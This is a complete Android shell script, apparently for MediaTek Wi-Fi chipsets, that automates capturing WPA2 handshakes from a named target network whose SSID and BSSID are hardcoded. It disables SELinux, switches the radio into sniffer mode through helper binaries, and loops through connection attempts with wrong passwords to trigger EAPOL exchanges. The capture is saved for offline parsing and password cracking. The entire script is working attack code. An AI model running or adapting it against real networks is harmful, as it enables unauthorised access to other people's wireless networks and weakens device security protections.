#!/system/bin/sh
# MTK Handshake Capture — automated attack loop
# Usage: mtk_handshake_attack.sh <SSID> <BSSID> <FREQ> [timeout_minutes]

SSID="${1:-LichaWireless}"
BSSID="${2:-34:98:b5:46:39:27}"
FREQ="${3:-5200}"
TIMEOUT="${4:-10}"
DIR="/data/local/tmp/wificracker"
CAP="$DIR/captures/handshake_$(date +%s).bin"

echo "[*] Target: $SSID ($BSSID) on $FREQ MHz"
echo "[*] Timeout: ${TIMEOUT}min"
echo "[*] Output: $CAP"

# Step 0: Setup
setenforce 0
mkdir -p "$DIR/captures"

# Step 1: Activate SNIFFER via ioctl 0x8BE5
echo "[*] Activating SNIFFER..."
$DIR/sniffer_direct wlan0 "SNIFFER 2 0 0 0 0 0 0 0 0 0" 2>/dev/null

# Step 2: Start ICS capture in background
SECONDS_TOTAL=$((TIMEOUT * 60))
echo "[*] Starting ${SECONDS_TOTAL}s ICS capture..."
$DIR/ics_enable 2 1 $SECONDS_TOTAL > "$CAP" 2>/tmp/ics_attack.log &
ICS_PID=$!
sleep 2

# Step 3: Loop — connect with wrong password to lock on channel + capture EAPOL
ATTEMPT=0
START=$(date +%s)
while true; do
    ELAPSED=$(( $(date +%s) - START ))
    if [ $ELAPSED -ge $SECONDS_TOTAL ]; then
        echo "[*] Timeout reached."
        break
    fi
    
    ATTEMPT=$((ATTEMPT + 1))
    REMAINING=$(( SECONDS_TOTAL - ELAPSED ))
    echo "[*] Attempt $ATTEMPT (${ELAPSED}s elapsed, ${REMAINING}s remaining)"
    
    # Connect with wrong password — triggers M1 exchange + puts driver on-channel
    cmd wifi connect-network "$SSID" wpa2 "wrongpass_attempt_${ATTEMPT}" 2>/dev/null
    sleep 8
    
    # Quick check: any EAPOL in capture so far?
    SIZE=$(wc -c < "$CAP" 2>/dev/null || echo 0)
    echo "    Captured: ${SIZE} bytes"
done

# Step 4: Wait for ICS to finish
echo "[*] Waiting for capture to complete..."
wait $ICS_PID 2>/dev/null

SIZE=$(wc -c < "$CAP")
echo "[*] Done! Capture: $CAP ($SIZE bytes)"
echo "[*] Analyze with: mtk_parse_handshake.py $CAP"
